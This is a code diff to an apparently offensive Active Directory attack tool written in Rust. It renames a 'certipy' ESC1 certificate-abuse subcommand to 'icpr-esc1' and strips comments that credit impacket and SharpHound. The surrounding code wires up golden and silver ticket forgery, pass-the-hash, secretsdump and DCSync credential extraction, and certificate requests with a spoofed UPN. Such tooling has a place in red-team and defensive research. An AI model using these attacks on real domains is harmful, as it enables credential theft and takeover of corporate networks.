@@ -353,12 +353,13 @@ enum AttackCmd {
     Winrm(WinrmArgs),
     /// AD CS ESC1: enroll a client-auth cert with a spoofed UPN SAN on a vuln template.
     Esc1(Esc1Args),
-    /// Certipy-style ESC1 request via `ms-icpr`: build a CSR with an
+    /// ESC1 request marshaled via `ms-icpr`: build a CSR with an
     /// attacker-supplied UPN SAN and marshal the `CertServerRequest` opnum.
     /// Sealed `\PIPE\cert` transport is not wired in this build — the command
     /// runs offline preflight + emits the marshaled bytes so the wire can be
     /// verified before a live submission.
-    Certipy(CertipyArgs),
+    #[command(name = "icpr-esc1")]
+    IcprEsc1(IcprEsc1Args),
     /// Golden ticket: forge a TGT for any identity with the krbtgt AES256 key (from `dcsync krbtgt`).
     Golden(GoldenArgs),
     /// Silver ticket: forge a service ticket (TGS) for an SPN with the service account's AES256 key.
@@ -517,7 +518,7 @@ enum EscVariant {
 }
 
 #[derive(Parser)]
-struct CertipyArgs {
+struct IcprEsc1Args {
     /// CA name (e.g. `corp-CA`) — target `pKIEnrollmentService.cn`.
     #[arg(long)]
     ca: String,
@@ -536,10 +537,10 @@ struct CertipyArgs {
     key: Option<String>,
     /// Write the marshaled `CertServerRequest` stub bytes here (base64 skipped
     /// — raw DCE/RPC input stub for offline diffing / relay).
-    #[arg(long, default_value = "certipy.stub")]
+    #[arg(long, default_value = "icpr-esc1.stub")]
     out: String,
     /// Write the CSR DER here.
-    #[arg(long, default_value = "certipy.csr")]
+    #[arg(long, default_value = "icpr-esc1.csr")]
     csr_out: String,
     /// Enrollment-agent schema-version override. ms-icpr's preflight rejects
     /// templates with `min_ra_signatures > 0`; this flag forces a synthetic
@@ -1040,7 +1041,7 @@ struct ScanArgs {
     /// SASL GSSAPI bind (signed LDAP over 389 via ambient Kerberos; needs `--features gssapi`)
     #[arg(long)]
     gssapi: bool,
-    /// Also export the collected domain as a BloodHound .zip at this path (SharpHound JSON)
+    /// Also export the collected domain as a BloodHound .zip at this path (BloodHound CE v5 ingest JSON)
     #[arg(long)]
     bloodhound: Option<String>,
 }
@@ -1128,7 +1129,7 @@ fn cmd_label(cmd: &Command) -> &'static str {
             AttackCmd::Laps(_) => "attack laps",
             AttackCmd::Winrm(_) => "attack winrm",
             AttackCmd::Esc1(_) => "attack esc1",
-            AttackCmd::Certipy(_) => "attack certipy",
+            AttackCmd::IcprEsc1(_) => "attack icpr-esc1",
             AttackCmd::Golden(_) => "attack golden",
             AttackCmd::Silver(_) => "attack silver",
             AttackCmd::Pth(_) => "attack pth",
@@ -1182,7 +1183,7 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Laps(a)) => laps(a).await,
         Command::Attack(AttackCmd::Winrm(a)) => winrm_exec(a).await,
         Command::Attack(AttackCmd::Esc1(a)) => esc1(a).await,
-        Command::Attack(AttackCmd::Certipy(a)) => certipy(a).await,
+        Command::Attack(AttackCmd::IcprEsc1(a)) => icpr_esc1(a).await,
         Command::Attack(AttackCmd::Golden(a)) => golden(a).await,
         Command::Attack(AttackCmd::Silver(a)) => silver(a).await,
         Command::Attack(AttackCmd::Pth(a)) => pth(a).await,
@@ -1694,8 +1695,7 @@ async fn secretsdump(a: SecretsdumpArgs) -> Result<()> {
     // no 15 MB hive download, no polling. Only falls back to the hive-save path if the
     // Remote Registry service is unreachable.
     // Fast path: full RRP secretsdump (bootkey + SAM users + LSA secrets) — no `reg save`
-    // anywhere, matches impacket-secretsdump's mechanism byte-for-byte. Falls back to the
-    // hive-save path if Remote Registry is off or any RRP step fails.
+    // anywhere. Falls back to the hive-save path if Remote Registry is off or any RRP step fails.
     let mut rrp_sam: Option<Vec<adhammer_secrets::SamAccount>> = None;
     let mut rrp_lsa: Option<Vec<adhammer_secrets::LsaSecret>> = None;
     let bootkey_rrp = {
@@ -2813,7 +2813,7 @@ async fn lsa(a: LsaArgs) -> Result<()> {
     Ok(())
 }
 
-/// Full impacket-style path: SMB2 negotiate → NTLM session → IPC$ → \samr pipe →
+/// Full path: SMB2 negotiate → NTLM session → IPC$ → \samr pipe →
 /// DCE/RPC bind → SamrConnect → enumerate domain users.
 async fn samr(a: SamrArgs) -> Result<()> {
     use dcerpc::samr::SamrClient;
@@ -4616,7 +4616,7 @@ async fn scan(a: ScanArgs) -> Result<()> {
         }
     }
 
-    // Optional BloodHound export (SharpHound-compatible .zip) alongside the report.
+    // Optional BloodHound export (BloodHound CE v5 ingest .zip) alongside the report.
     if let Some(path) = &a.bloodhound {
         let p = std::path::Path::new(path);
         let n = adhammer_bloodhound::export_zip(&snap, p)?;
@@ -5088,13 +5088,13 @@ async fn dump_gmsa(a: DumpGmsaArgs) -> Result<()> {
     .await
 }
 
-/// `attack certipy` — build an ESC1 CSR via `ms-icpr` with an attacker-supplied UPN
+/// `attack icpr-esc1` — build an ESC1 CSR via `ms-icpr` with an attacker-supplied UPN
 /// SAN and marshal the `CertServerRequest` opnum-0 input stub. Offline: writes the
 /// CSR + stub to disk (and a fresh RSA key if none supplied) so the wire can be
 /// verified before a live submission. The sealed `\PIPE\cert` transport requires
 /// `ms-icpr`'s `network` feature — disabled in this build to keep the workspace
 /// off the `dcerpc↔ms-nrpc` resolver cycle — and stays a TODO here.
-async fn certipy(a: CertipyArgs) -> Result<()> {
+async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
     use ms_crtd::flags::{EnrollmentFlag, NameFlag, PrivateKeyFlag};
     use ms_crtd::model::CertTemplate;
     use ms_crtd::oid::Oid;
